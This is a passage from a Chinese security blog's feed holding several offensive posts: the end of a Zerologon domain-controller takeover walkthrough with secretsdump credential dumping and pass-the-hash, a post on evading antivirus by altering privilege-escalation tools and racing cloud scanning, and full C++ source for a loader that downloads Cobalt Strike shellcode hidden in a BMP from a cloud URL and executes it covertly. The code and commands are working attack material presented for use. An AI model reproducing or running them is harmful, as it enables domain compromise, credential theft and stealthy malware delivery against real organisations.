Mac攻击机
172.21.139.37
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1600356207906.png" alt="" loading="lazy"></figure>
<h3 id="0x04-过程记录">0x04 过程记录</h3>
<ul>
<li>正向SOCKS5：将被攻击机器的流量代理到Mac攻击机中,Mac用proxychains4代理<br>
(拿到一个入口点,把流量代理出去)</li>
</ul>
<pre><code>  ew_for_Win.exe -s ssocksd -l 8888
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1600356240721.png" alt="" loading="lazy"></figure>
<ul>
<li>定位域控IP</li>
</ul>
<pre><code>  net time /domain
  ping  DC
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1600356991318.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>检测域控是否存在此漏洞</p>
<pre><code>  ./proxychains4 python3 zerologon_tester.py DC(域控名字) 10.10.10.10(域控IP)
  返回Success,代表存在漏洞
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://www.svenbeast.com/post-images/1600357588845.png" alt="" loading="lazy"></figure>
</li>
<li>
<p>重置域控账户密码</p>
<pre><code>./proxychains4 python3 cve-2020-1472-exploit.py  DC 10.10.10.10
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://www.svenbeast.com/post-images/1600360388537.png" alt="" loading="lazy"></figure>
</li>
<li>
<p>可进行操作1：此时域控密码为空，同等于已知密码，所以可以导出域内所有用户凭据</p>
<pre><code>proxychains4 secretsdump.py test.local/dc\$@10.10.10.10 -no-pass
proxychains4 secretsdump.py test.local/域控名字\$@10.10.10.10 -no-pass
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://www.svenbeast.com/post-images/1600361080536.png" alt="" loading="lazy"></figure>
</li>
<li>
<p>可进行操作2：获取域管理员名字，导出域管的hash</p>
<pre><code>net group &quot;domain admins&quot;  /domain
./proxychains4 secretsdump.py test.local/dc\$@10.10.10.10 -no-pass -just-dc | grep 'Administrator'
</code></pre>
<p><img src="https://www.svenbeast.com/post-images/1600362035651.png" alt="" loading="lazy"><br>
<img src="https://www.svenbeast.com/post-images/1600362065199.png" alt="" loading="lazy"></p>
</li>
<li>
<p>可进行操作3：已知域管hash，通过wmic 拿到域控制器中的本地管理员权限，nice~ (域管)</p>
<pre><code>./proxychains4 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 test.local/Administrator@10.10.10.10
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://www.svenbeast.com/post-images/1600362422752.png" alt="" loading="lazy"></figure>
</li>
<li>
<p>恢复域控密码：已经通过wmic拿到域控本地管理员权限时，开始导出sam数据库中原来的计算机hash</p>
<pre><code>reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.save
get security.save
del /f system.save
del /f sam.save
del /f security.save
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://www.svenbeast.com/post-images/1600363234006.png" alt="" loading="lazy"></figure>
<pre><code>利用导出的sam数据库，提取出机器账号的明文hex
./proxychains4 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://www.svenbeast.com/post-images/1600363602661.png" alt="" loading="lazy"></figure>
<pre><code>利用提取的明文hex，进行最后的恢复操作
./proxychains4 python3 restorepassword.py DC@DC -target-ip 10.10.10.10 -hexpass 
</code></pre>
<p><img src="https://www.svenbeast.com/post-images/1600363893799.png" alt="" loading="lazy"><br>
<strong>PS: 恢复后的hash经过检查，完整恢复，和漏洞利用前的hash是一样的</strong></p>
</li>
</ul>
<h3 id="0x04-坑点">0x04 坑点</h3>
<ul>
<li>exp运行中会因为impacket报错，重新安装此模块即可<pre><code>git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket &amp;&amp; pip3 install .
</code></pre>
</li>
<li>一些脚本是impacket模块里面的py文件</li>
<li>exp的一些参数，最好搞清楚对应域的那些东西</li>
<li>图片很多，环境麻烦，能挤出时间真不容易。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[【研究】从1到针对AV某种场景下的免杀探究过程]]></title>
        <id>https://www.svenbeast.com/post/yan-jiu-mou-zhong-chang-jing-bypassav/</id>
        <link href="https://www.svenbeast.com/post/yan-jiu-mou-zhong-chang-jing-bypassav/">
        </link>
        <updated>2020-09-02T09:23:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x01-起因">0x01  起因</h3>
<p>  现在是信息化爆炸时代，为了能够更全面的吸收(copy)知识的力量，最近搭建了微信公众号的RSS系统，而在调试阶段中看到了这样的一篇文章 <a href="https://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&amp;mid=2653570889&amp;idx=1&amp;sn=82f1f6196b781da0378c8cd13e2efb9b&amp;chksm=811b510bb66cd81d67a065d735457b7e270a8b0963ae205860e988fcea4b7411803a12223dd2#rd">printspoofer免杀过360全家桶</a>，很喜欢这种实用文章，安全行业怎么都是需要用或者接触一些免杀的东西，不怕用不上，就怕不知道。</p>
<p>  现在的文章要不就是没用的水文(比如我)，要不就是看不懂的水文(巨佬)，很赞同klion师傅一篇文章解决一个实际问题的这种风格，也很喜欢酒仙桥发文的排版和文笔，额。闲话到此为止。</p>
<p><strong>主要内容是记录由moonsec的文章引发对某AV针对这种漏洞利用工具查杀规则的探究过程与利用方法</strong></p>
<h3 id="0x02-还原文章流程">0x02 还原文章流程</h3>
<p><strong>PrintSpoofer是一个windows本地提权利用工具</strong><br>
<strong>本次测试过程中的exe生成全部选择生成x86位程序</strong><br>
<img src="https://www.svenbeast.com/post-images/1599554980760.png" alt="" loading="lazy"></p>
<ul>
<li>
<p>1.公众号文章中是针对<a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a>分享的免杀方法，那先生成出PrintSpoofer.exe，放入布置在公网装有火绒和360的VPS中(vps的环境感觉更接近真实情况)，意料中的飞速kill，也就是ctrl+v读条刚刚结束的瞬间<br>
<img src="https://www.svenbeast.com/post-images/1599552417442.png" alt="" loading="lazy"><br>
<img src="https://www.svenbeast.com/post-images/1599552978648.png" alt="" loading="lazy"></p>
</li>
<li>
<p>2.文中的处理方法，按照这个进行修改，结果没有问题，成功bypassAV(其实主要是过数字AV的主动云查杀，同时云查杀也是数字AV的亮点)</p>
</li>
</ul>
<pre><code>   ·PrintSpoofer 将这个关键词替换成其他字符串 如 moonsec
   ·PrintSpoofer.cpp PrintSpoofer.h 全部改为 moonsec
   ·帮助注释全部处理掉
   ·release x64 重新生成 (截止到文章编辑结束，目前如果生成x64位的会被查杀，x86位没有问题)
</code></pre>
<p><img src="https://www.svenbeast.com/post-images/1599553570677.png" alt="" loading="lazy"><br>
<img src="https://www.svenbeast.com/post-images/1599553799847.png" alt="" loading="lazy"></p>
<h3 id="0x03-思考">0x03 思考</h3>
<ul>
<li>1.为什么修改关键词可以过掉主动查杀，修改哪个关键词命中规则，还是修改关键词导致改变了什么呢，开始尝试缩减关键词范围</li>
</ul>
<pre><code>    只进行 PrintSpoofer 将这个关键词替换成其他字符串 如 moonsec
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1599554444596.png" alt="" loading="lazy"></figure>
<pre><code>发现同样未被查杀，没有问题，看来可以继续追一下
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1599554795149.png" alt="" loading="lazy"></figure>
<ul>
<li>2.上次修改了5处PrintSpoofer字符串，那么这次选择只修改include这一处是否可以呢<br>
<img src="https://www.svenbeast.com/post-images/1599555928746.png" alt="" loading="lazy"></li>
</ul>
<pre><code>发现被查杀 kill，看来include这里不是关键点
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1599558103039.png" alt="" loading="lazy"></figure>
<ul>
<li>3.上次修改了include这一处，本质上没有改变源代码的逻辑，那么是否改变逻辑才是关键点呢</li>
</ul>
<pre><code>    修改代码中的源代码，从逻辑上进行修改，此次在任意位置添加一句输出，这是最简单的办法
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://www.svenbeast.com/post-images/1599559995471.png" alt="" loading="lazy"></figure>
<pre><code>    从结果来看，是没有被查杀的
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://www.svenbeast.com/post-images/1599705913632.png" alt="" loading="lazy"></figure>
<h3 id="0x04-延伸">0x04 延伸</h3>
<ul>
<li>那么既然改变逻辑是一个小关键点（开始以为是exe的md5是唯一的，不过发现每次生成的exe的md5都是不一样的，这些东西算是知识盲区哈，我就理解为相同代码生成的exe有一个唯一标识，改个逻辑就可以改了唯一标识这样子，懂得师傅请别在意哈0.0），那么针对其他CVE提权工具是否有效呢</li>
</ul>
<pre><code>    CVE-2020-0796：https://github.com/danigargu/CVE-2020-0796
    目前Github的star数上千 ，理论上是一个流行且影响广泛的windows本地提权的漏洞      

    · 我生成了一个原版exe，一个update版exe，结果是全部被淘汰，但是细心的我发现了一点不同。。此处上gif来体现
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://www.svenbeast.com/post-images/1599723056962.gif" alt="" loading="lazy"></figure>
<pre><code>    又经过了几次尝试，可以确定原版基本是秒杀，偶尔才是AV会宕机一会后查杀，而修改版是经过几十秒到几分钟不等后才会被查杀，且查杀后重复此过程的话修改版也会被秒杀  「划重点：中途可成功运行exe」
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://www.svenbeast.com/post-images/1599729008146.gif" alt="" loading="lazy"></figure>
<h3 id="0x05-结论">0x05 结论</h3>
<pre><code>1.数字AV应该是对这些漏洞利用工具为了查杀效率，占用cpu大小或者其他目的来使用不同的查杀规则对待

2.比如一般的就是唯一标识查杀，本地查杀库存在就直接查杀，在流行的就是唯一标识加沙箱或者其他深度
唯一标识查杀等等，本地查杀库没有的上传云数据库或者沙箱来得出结论进行查杀

3.而无论是沙箱或者深度唯一标识查杀，都是需要计算资源来支持，存在的过程推断大概为：上传-&gt;云资源
计算(云查杀库或者沙箱什么的)-&gt;得出结果并返回

4.那么数字AV的用户何其庞大，可能按亿计算，猜测每时每秒接受的可疑文件上传数量数字是很大的，再加
上查询或者检测时间，整体占用的资源听起来就是买不起的样子，而一个公司基于成本，产出，收益是不可能
配备完全可以达到实时检测的这种计算资源的，所以对于本地无法查杀的exe在上传到云的这段时间是必须存
在的，而这段时间对于这种漏洞利用工具是很友好的。

5.正常来说，这算是钻空子？貌似不太好解决的空子，这种增加计算资源，造成成本增加的东西应该不太好
申请下来，毕竟收益只是查杀速度快一点。
</code></pre>
<p>PS：当然也可能误打误撞得出这么一个结论，毕竟是好奇猜出来的 -.- !</p>
<p><strong>利用场景：目标机存在防护，上传提权脚本或其他程序被直接查杀，此时使用此方法争一个时间差获得一个system权限cmd完全没有问题，时间很充裕，理论上这个方法通杀。。</strong></p>
<h3 id="0x06-无源码时如何修改">0x06 无源码时如何修改</h3>
<ul>
<li>直接使用IDA修改exe就可以的，为了真实一些就尝试修改一个以前发在t00ls的<a href="https://www.t00ls.net/viewthread.php?tid=56199&amp;highlight=%E5%9C%9F%E8%B1%86">烂土豆</a></li>
</ul>
<pre><code>  下载下来，文件是正常运行的，当然现在肯定在查杀库里，直接秒杀，这是我又恢复出来后运行的
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://www.svenbeast.com/post-images/1599727404151.png" alt="" loading="lazy"></figure>
<pre><code>    打开后直接就看到了一些输出的字符串，这个中文蛮明显的。 我规矩点，还是搜字符串来找修改点
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://www.svenbeast.com/post-images/1599727900556.png" alt="" loading="lazy"></figure>
<pre><code>    点击 View -&gt; Open subviews -&gt; Strings    或者shift+f12    会出现IDA收集的这个exe的一些字符串片段
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://www.svenbeast.com/post-images/1599728312616.png" alt="" loading="lazy"></figure>
<pre><code>    根据exe运行过程中输出的一些提示语，找到后进去，这个大部分都是，双击一个中文进入Hex View，如下界面
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://www.svenbeast.com/post-images/1599728495066.png" alt="" loading="lazy"></figure>
<pre><code>    然后右键edit ，随便输入一些东西
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://www.svenbeast.com/post-images/1599728706406.png" alt="" loading="lazy"></figure>
<pre><code>    右键Apply changes   然后点击   Edit -&gt; Patch program -&gt; Apply patches to input file...  -&gt;  出现的界面点ok
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://www.svenbeast.com/post-images/1599728848560.png" alt="" loading="lazy"></figure>
<pre><code>    结果没有问题，可以运行
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://www.svenbeast.com/post-images/1599730169362.gif" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[【学习】图片隐写shellcode进行远程加载过AV]]></title>
        <id>https://www.svenbeast.com/post/xue-xi-tu-pian-yin-xie-shellcode-jin-xing-yuan-cheng-jia-zai-guo-av/</id>
        <link href="https://www.svenbeast.com/post/xue-xi-tu-pian-yin-xie-shellcode-jin-xing-yuan-cheng-jia-zai-guo-av/">
        </link>
        <updated>2020-08-27T08:47:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x01-参考链接">0x01 参考链接</h3>
<ol>
<li>https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw</li>
<li>https://www.t00ls.net/redirect-57618.html#lastpost</li>
</ol>
<h3 id="0x02-学习思路">0x02 学习思路</h3>
<p><strong>改动：修改了原exe执行后存在控制台现象，目前是控制台自动消失后台静默执行</strong></p>
<pre><code>1. CS生成C的shellcode，使用Python进行Hex编码
2. 将Hex编码注入到bmp图片的文件头
3. 图片上传到公网,此处为阿里的对象存储oss里
3. 获得图片，解析出shellcode后执行
</code></pre>
<h3 id="0x03-从0到1的前期准备">0x03 从0到1的前期准备</h3>
<pre><code>1. 安装Visual Studio 2019 ，这个需要些时间安装一些依赖库，推荐专业版，可以搜索安装教程照做即可
</code></pre>
<p>https://visualstudio.microsoft.com/zh-hans/vs/<br>
https://www.cnblogs.com/hsjj/p/VisualStudio.html</p>
<pre><code>2. 开通阿里云对象存储OSS服务
  登录阿里云-控制台-对象存储-开通成功-创建Bucket(修改为公共读，其他默认)
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1598524329860.png" alt="" loading="lazy"></figure>
<pre><code>3. CS生成shellcode，将payload.c里的shellcode使用python进行Hex编码
</code></pre>
<p><img src="https://www.svenbeast.com/post-images/1598525253896.png" alt="" loading="lazy"><br>
<img src="https://www.svenbeast.com/post-images/1598525263644.png" alt="" loading="lazy"><br>
<img src="https://www.svenbeast.com/post-images/1598525420498.png" alt="" loading="lazy"></p>
<pre><code>4. getImgshellcode.exe  做好生成准备，此exe功能是将shellcode注入bmp图片文件
</code></pre>
<pre><code>Github：https://github.com/sv3nbeast/ImgLoaderShellCode

核心代码
#include &quot;dwBmpSize.h&quot;
#include &lt;iostream&gt;
using namespace std;

CBMPHide::CBMPHide()
{
	sBmpFileName = &quot;&quot;;
	pBuf = 0;
	dwBmpSize = 0;
	ptxtBuf = 0;
	pExEBuf = 0;
}

CBMPHide::~CBMPHide()
{

}

bool CBMPHide::setBmpFileName(char* szFileName)
{
	this-&gt;sBmpFileName = szFileName;
	if (pBuf)	//如果已经生成就释放掉
	{
		delete[]pBuf;
	}

	HANDLE hfile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	//和struct BITMAPFILEHEADER bmfh里面的 bfSize的大小应该是一样的。
	dwBmpSize = GetFileSize(hfile, 0);	//获取文件的大小
	pBuf = new byte[dwBmpSize + 83968];
	DWORD dwRead = 0;
	ReadFile(hfile, pBuf, dwBmpSize, &amp;dwRead, 0);
	if (dwRead != dwBmpSize)
	{
		delete[]pBuf;
		pBuf = 0;
		return false;
	}
	CloseHandle(hfile);
	m_fileHdr = (BITMAPFILEHEADER*)pBuf;
	m_infoHdr = (BITMAPINFOHEADER*)(pBuf + sizeof(BITMAPFILEHEADER));
	return true;	//成功话就是文件的内容读取到pBuf里面
}


int CBMPHide::getBmpWidth()
{
	return m_infoHdr-&gt;biWidth;
}

int CBMPHide::getBmpHeight()
{
	return m_infoHdr-&gt;biHeight;
}

int CBMPHide::getBmpBitCount()
{
	return m_infoHdr-&gt;biBitCount;
}

bool CBMPHide::save()
{
	string sDstFileName = &quot;save.bmp&quot;;
	HANDLE hfile = CreateFileA(sDstFileName.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS, 0, 0);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	DWORD dwWritten = 0;
	WriteFile(hfile, pBuf, dwBmpSize + 83968, &amp;dwWritten, 0);
	if (dwBmpSize != dwWritten)
	{
		return false;
	}
	CloseHandle(hfile);
	return true;
}
//隐藏一个字符串到图片中，把字符串拆成字节，写入每个像素的alpha通道中
bool CBMPHide::hideString2BMP(char* szStr2Hide)
{
	LPBYTE pAlpha = pBuf + m_fileHdr-&gt;bfOffBits + 3;	//第一个像素的通道位置
	//cout &lt;&lt; pAlpha &lt;&lt; endl;
	int nHide;	//成功隐藏的字节数

	//每次循环写入一个字节，吸入alpha通道
	//(pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize这个是判断字符串是太大，图片不能隐藏
	for (nHide = 0; (pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize &amp;&amp; szStr2Hide[nHide] != 0; nHide++, pAlpha += 4)
	{
		//cout &lt;&lt; nHide &lt;&lt; endl;
		*pAlpha = szStr2Hide[nHide];	//写入一个字节
		//cout &lt;&lt; pAlpha &lt;&lt; endl;
	}

	return true;
}

void CBMPHide::showStringInBmp(char* szBmpFIleName/*=NULL*/)
{
	string sDstFileName = &quot;save.bmp&quot;;
	sDstFileName = szBmpFIleName;

	HANDLE hfile = CreateFileA(sDstFileName.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING, 0, 0);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	DWORD dwSize = GetFileSize(hfile, 0);
	LPBYTE pBuf1 = new byte[dwSize];

	DWORD dwRead = 0;

	ReadFile(hfile, pBuf1, dwSize, &amp;dwRead, 0);
	CloseHandle(hfile);

	//文件内容读取到pBuf1中
	BITMAPFILEHEADER* pHdr = (BITMAPFILEHEADER*)pBuf1;
	LPBYTE pStr = pBuf1 + pHdr-&gt;bfOffBits + 3;
	char szTmp[1280];
	RtlZeroMemory(szTmp, 1280);
	for (int i = 0; i &lt; 1280; i++)
	{
		if (*pStr == 0 || *pStr == 0xFF)
		{
			break;
		}
		szTmp[i] = *pStr;
		pStr += 4;
	}
	printf_s(szTmp);

	delete[]pBuf1;
}

int main(int argc, char* argv[])
{
	if (argc &lt; 2)
	{
		wprintf(L&quot;Command: %S &lt;SHELLCODE&gt; ...\n&quot;, argv[0]);
		return -1;
	}


	CBMPHide hide;
	hide.setBmpFileName((char*)&quot;test.bmp&quot;);
	printf_s(&quot;test.bmp width:%d,height:%d,bitCount%d\n&quot;,
		hide.getBmpWidth(),
		hide.getBmpHeight(),
		hide.getBmpBitCount());
	char* shellcode = argv[1];
	hide.hideString2BMP((char*)shellcode);
	hide.save();
	cout &lt;&lt; shellcode &lt;&lt; endl;
}

</code></pre>
<pre><code>1. ShellcodeImg.exe 做好生成准备，此exe功能是获得远程图片，执行shellcode
</code></pre>
<pre><code>Github：https://github.com/sv3nbeast/ImgLoaderShellCode

核心代码
#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;Winhttp.h&gt;
#include &lt;WinDNS.h&gt;
#include &lt;iterator&gt;
#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;WinDNS.h&gt;
#include &lt;string&gt;
#include &lt;vector&gt;

#pragma comment(lib,&quot;Winhttp.lib&quot;)
#pragma comment(lib,&quot;urlmon.lib&quot;)



using namespace std;

struct CachedDnsRecord
{
	wstring name;
	int type;
};

#define INET_ADDRSTRLEN     22
#define INET6_ADDRSTRLEN    65


typedef void(*DownLoadCallback)(int ContentSize, int CUR_LEN);

typedef struct _URL_INFO
{
	WCHAR szScheme[512];
	WCHAR szHostName[512];
	WCHAR szUserName[512];
	WCHAR szPassword[512];
	WCHAR szUrlPath[512];
	WCHAR szExtraInfo[512];
}URL_INFO, * PURL_INFO;




void dcallback(int ContentSize, int file_size)
{
	//printf(&quot;count:%d,size:%d\n&quot;, ContentSize, file_size);
}

void download(const wchar_t* Url, const wchar_t* FileName, DownLoadCallback Func)
{
	URL_INFO url_info = { 0 };
	URL_COMPONENTSW lpUrlComponents = { 0 };
	lpUrlComponents.dwStructSize = sizeof(lpUrlComponents);
	lpUrlComponents.lpszExtraInfo = url_info.szExtraInfo;
	lpUrlComponents.lpszHostName = url_info.szHostName;
	lpUrlComponents.lpszPassword = url_info.szPassword;
	lpUrlComponents.lpszScheme = url_info.szScheme;
	lpUrlComponents.lpszUrlPath = url_info.szUrlPath;
	lpUrlComponents.lpszUserName = url_info.szUserName;

	lpUrlComponents.dwExtraInfoLength =
		lpUrlComponents.dwHostNameLength =
		lpUrlComponents.dwPasswordLength =
		lpUrlComponents.dwSchemeLength =
		lpUrlComponents.dwUrlPathLength =
		lpUrlComponents.dwUserNameLength = 512;

	WinHttpCrackUrl(Url, 0, ICU_ESCAPE, &amp;lpUrlComponents);

	HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
	DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0;
	HINTERNET hConnect = WinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L&quot;HEAD&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	WinHttpReceiveResponse(hRequest, 0);
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &amp;dwContentSize, &amp;dwSizeDW, &amp;dwIndex);
	WinHttpCloseHandle(hRequest);

	hRequest = WinHttpOpenRequest(hConnect, L&quot;GET&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	WinHttpReceiveResponse(hRequest, 0);

	BYTE* pBuffer = NULL;
	pBuffer = new BYTE[dwContentSize];
	ZeroMemory(pBuffer, dwContentSize);
	do {
		WinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes);
		Func(dwContentSize, dwReadBytes);
	} while (dwReadBytes == 0);
	//cout &lt;&lt; pBuffer &lt;&lt; endl;
	BITMAPFILEHEADER* pHdr = (BITMAPFILEHEADER*)pBuffer;

	LPBYTE pStr = pBuffer + pHdr-&gt;bfOffBits + 3;
	char szTmp[1900];
	RtlZeroMemory(szTmp, 1900);
	
	for (int i = 0; i &lt; 1900; i++)
	{

		if (*pStr == 0 || *pStr == 0xFF)
		{
	
			break;
		}
		
		szTmp[i] = *pStr;
		pStr += 4;

	}
	

	unsigned int char_in_hex;
	unsigned int iterations = strlen(szTmp);

	unsigned int memory_allocation = strlen(szTmp) / 2;

	VirtualProtect(szTmp, memory_allocation, PAGE_READWRITE, 0);

	for (unsigned int i = 0; i &lt; iterations / 2; i++) {
		sscanf_s(szTmp + 2 * i, &quot;%2X&quot;, &amp;char_in_hex);
		szTmp[i] = (char)char_in_hex;

	}
	

	void* abvc = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
	
	memcpy(abvc, szTmp, memory_allocation);
	
	DWORD ignore;
	VirtualProtect(abvc, memory_allocation, PAGE_EXECUTE, &amp;ignore);

	(*(void(*)()) abvc)();
	delete pBuffer;
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);

}


typedef struct _DNS_CACHE_ENTRY
{
	struct _DNS_CACHE_ENTRY* pNext; // Pointer to next entry
	PWSTR pszName; // DNS Record Name
	unsigned short wType; // DNS Record Type
	unsigned short wDataLength; // Not referenced
	unsigned long dwFlags; // DNS Record Flags
} DNSCACHEENTRY, * PDNSCACHEENTRY;

typedef int(WINAPI* DNS_GET_CACHE_DATA_TABLE)(PDNSCACHEENTRY);

vector&lt;CachedDnsRecord&gt; getDnsCache()
{
	vector&lt;CachedDnsRecord&gt; results;

	PDNSCACHEENTRY pEntry = (PDNSCACHEENTRY)malloc(sizeof(DNSCACHEENTRY));
	HINSTANCE hLib = LoadLibrary(TEXT(&quot;DNSAPI.dll&quot;));
	DNS_GET_CACHE_DATA_TABLE DnsGetCacheDataTable =
		(DNS_GET_CACHE_DATA_TABLE)GetProcAddress(hLib, &quot;DnsGetCacheDataTable&quot;);

	int stat = DnsGetCacheDataTable(pEntry);
	pEntry = pEntry-&gt;pNext;
	while (pEntry)
	{
		CachedDnsRecord record;
		record.name = wstring(pEntry-&gt;pszName);
		record.type = pEntry-&gt;wType;
		results.push_back(record);
		pEntry = pEntry-&gt;pNext;
	}
	free(pEntry);
	if (!results.empty())
	{	
	
		download(L&quot;https://code.oss-cn-beijing.aliyuncs.com:80/save.bmp&quot;, L&quot;1633Music&quot;, &amp;dcallback);
	}
	else
	{
		exit(0);
	}
	return results;
}


int main()
{
	HWND hwndDOS = GetForegroundWindow();
	ShowWindow(hwndDOS, SW_HIDE);
	auto cache = getDnsCache();
	return 0;

}
</code></pre>
<h3 id="0x04-开始运行">0x04 开始运行</h3>
<pre><code>1. 将任意.bmp图片文件改成test.bmp放入生成的getImgshellcode.exe同目录,并且复制生成好的Hex编码后的shellcode，进行注入,同目录生成save.bmp
</code></pre>
<p><img src="https://www.svenbeast.com/post-images/1598581597391.png" alt="" loading="lazy"><br>
<img src="https://www.svenbeast.com/post-images/1598581705437.png" alt="" loading="lazy"></p>
<pre><code>2. 上传save.bmp到阿里OSS里，点击上传的图片获得访问URL并复制
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1598580605228.png" alt="" loading="lazy"></figure>
<pre><code>3. 生成ShellcodeImg.exe，先修改176行的图片地址为上步骤的URL在生成
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1598583016304.png" alt="" loading="lazy"></figure>
<pre><code>4. 在公网vps模拟真实环境运行AV情况下执行ShellcodeImg.exe，并未遭到拦截，且成功执行命令
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://www.svenbeast.com/post-images/1598596035905.gif" alt="" loading="lazy"></figure>
<h3 id="0x05-可能会有用的小知识">0x05 &quot;可能&quot;会有用的小知识</h3>
<pre><code>1. 如果想要在其他机器运行成功VS生成的exe时，生成时要选择Release，为了兼容性选择x86，然后生成即可
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://www.svenbeast.com/post-images/1598596419676.png" alt="" loading="lazy"></figure>
<pre><code>2. VS建造的项目文件夹都会存在.sln文件，双击.sln文件即可自动打开整个项目，还原项目本身
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://www.svenbeast.com/post-images/1598596650878.png" alt="" loading="lazy"></figure>
<h3 id="0x06-可能会遇到的问题">0x06 &quot;可能&quot;会遇到的问题</h3>
<pre><code>1. exe执行后无法正常上线，原因可能是填入图片URL的时候没有加入端口，导致并未成功下载图片解析，如图就是没有写端口导致运行时并未成功获得图片进行解析
   正确：https://code.oss-cn-beijing.aliyuncs.com:80/save.bmp
   错误：https://code.oss-cn-beijing.aliyuncs.com/save.bmp
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://www.svenbeast.com/post-images/1598597977930.png" alt="" loading="lazy"></figure>
<ul>
<li><strong>【可改进的地方】: 现在的操作是运行exe后生成控制台然后关闭控制台操作，会有控制台闪一下然后消失的界面，过程虽然很快，但对配置低的机器还是有感的，如果添加运行exe后不出现控制台也就是不出现窗口直接隐藏后台静默执行的代码生成后会被AV检测查杀，希望以后有师傅进行改进吧 0.0 !</strong></li>
</ul>
<pre><code>可能会有人感觉写得啰嗦~ 其实是因为本人也是自己学习，都是摸索着来，所以对一些 &quot;坑&quot; 的基础小问题很敏感，因为在完全不会的情况下遇到其实都还蛮懵的，同样问题对不同的人来说难度确实是不一样的，所以，我还是赶紧衮去继续学习吧
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2020-5902 BIG-IP RCE  绕过tmsh限制命令执行&EXP编写]]></title>
        <id>https://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/</id>
        <link href="https://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/">
        </link>
        <updated>2020-07-06T02:58:25.000Z</updated>
